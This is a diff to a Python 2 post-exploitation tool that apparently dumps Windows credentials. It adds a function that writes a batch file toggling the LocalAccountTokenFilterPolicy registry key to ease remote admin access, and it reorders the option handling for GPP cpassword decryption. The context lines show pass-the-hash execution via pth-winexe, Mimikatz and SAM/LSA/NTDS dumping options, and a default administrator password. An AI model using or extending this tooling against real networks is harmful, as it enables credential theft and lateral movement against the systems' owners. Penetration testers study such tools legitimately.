@@ -56,6 +56,47 @@ def gppdecrypt(cpassword_pass):
 	o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
 	print colored('Your cpassword is '+o[:-ord(o[-1])].decode('utf16'),'green')
 
+def WriteLAT():
+	try:
+		print colored("[+]Attempting to write Local Account Token Filter Policy ",'green')
+		fout=open('/tmp/lat.bat','w')
+		fout.write('@echo off\n\n')
+		fout.write('cls\n')
+		fout.write('echo .\n')
+		fout.write('echo .\n')
+		fout.write('echo LocalAccountTokenFilterPolicy Enable/Disable Script\n')
+		fout.write('echo R Davy - NCCGroup	\n')
+		fout.write('echo .\n')
+		fout.write('echo .\n')
+		fout.write('echo [+] Searching Registry......\n')
+		fout.write('echo .\n')
+		fout.write('reg.exe query "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v "LocalAccountTokenFilterPolicy" | Find "0x1"\n')
+		fout.write('IF %ERRORLEVEL% == 1 goto turnon\n')
+		fout.write('If %ERRORLEVEL% == 0 goto remove\n\n')
+		fout.write('goto end\n')
+		fout.write(':remove\n\n')
+		fout.write('reg.exe delete "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /f \n')
+		fout.write('echo .\n')
+		fout.write('echo [+] Registry Key Removed \n')
+		fout.write('echo .\n')
+		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy\n')
+		fout.write('echo .\n')
+		fout.write('goto end\n\n')
+		fout.write(':turnon\n\n')
+		fout.write('reg.exe add "HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /D 1 \n')
+		fout.write('echo .\n')
+		fout.write('echo [+] Added Registry Key\n')
+		fout.write('echo .\n')
+		fout.write('echo HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy with value of 1\n')
+		fout.write('echo .\n')
+		fout.write('goto end\n\n')
+		fout.write(':end\n')
+		fout.close() 
+		print colored("[+]Written to /tmp/lat.bat ",'yellow')
+	except:
+		print colored("[-]Something went wrong...",'red')
+
+
 def datadump(user, passw, host, path, os_version):
 	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
 	signal_number = (return_value & 0x0F)
@@ -206,7 +247,6 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[-]mimi_creddump.txt file not found",'red')       
 				except OSError:
 					print colored("[-]Something went wrong running Mimikatz...",'red')
-
 						
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
@@ -362,7 +402,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("Simple example usage: ./%prog -H ip=192.168.0.1 -u administrator -p Password01", version="%prog 0.2a")
+p = argparse.ArgumentParser("Simple example usage: ./%prog -H ip=192.168.0.1 -u administrator -p Password01", version="%prog 0.2c")
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="administrator",help="Enter a username")
 p.add_argument("-p", "--password", dest="password", default="Password01", help="Enter a password or hash")
@@ -383,7 +423,47 @@ p.add_argument("-a", "--service_accounts", dest="service_accounts", default="n",
 p.add_argument("-F", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
 p.add_argument("-f", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
 
+p.add_argument("-L", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
+
 args = p.parse_args()
+
+user = args.username
+passw = args.password
+files = ['sam', 'system', 'security']
+progs = ['cachedump','lsadump']
+
+creddump7path=args.credpath
+outputpath=args.outputpath
+mergepf=args.mergepf
+credsfile=args.credsfile
+skiplsacache=args.skiplsacache
+dropshell=args.dropshell
+lsass_dump=args.lsass_dump
+policiesscripts_dump=args.policiesscripts_dump
+domain_name=args.domain_name
+c_password=args.c_password
+ntds_util=args.ntds_util
+drsuapi=args.drsuapi
+massmimi_dump=args.massmimi_dump
+service_accounts=args.service_accounts
+find_user=args.find_user
+ofind_user=args.ofind_user
+
+lat=args.lat
+
+if lat in yesanswers:
+	WriteLAT()
+	sys.exit()
+
+if c_password!='':
+	try:
+		banner()
+		print colored("[+]Attempting to decrypt cpassword:",'yellow')
+		gppdecrypt(c_password)
+		sys.exit()
+	except:
+		sys.exit()
+
 
 targets=[]
 remotetargets = args.host
@@ -416,31 +496,6 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
-
-#exit(1)
-
-user = args.username
-passw = args.password
-files = ['sam', 'system', 'security']
-progs = ['cachedump','lsadump']
-
-creddump7path=args.credpath
-outputpath=args.outputpath
-mergepf=args.mergepf
-credsfile=args.credsfile
-skiplsacache=args.skiplsacache
-dropshell=args.dropshell
-lsass_dump=args.lsass_dump
-policiesscripts_dump=args.policiesscripts_dump
-domain_name=args.domain_name
-c_password=args.c_password
-ntds_util=args.ntds_util
-drsuapi=args.drsuapi
-massmimi_dump=args.massmimi_dump
-service_accounts=args.service_accounts
-find_user=args.find_user
-ofind_user=args.ofind_user
-
 
 
 if drsuapi in yesanswers:
@@ -530,14 +585,6 @@ if ntds_util in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
-if c_password!='':
-	try:
-		banner()
-		print colored("[+]Attempting to decrypt cpassword:",'yellow')
-		gppdecrypt(c_password)
-		sys.exit()
-	except:
-		sys.exit()
 
 if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 	if len(targets)==1:
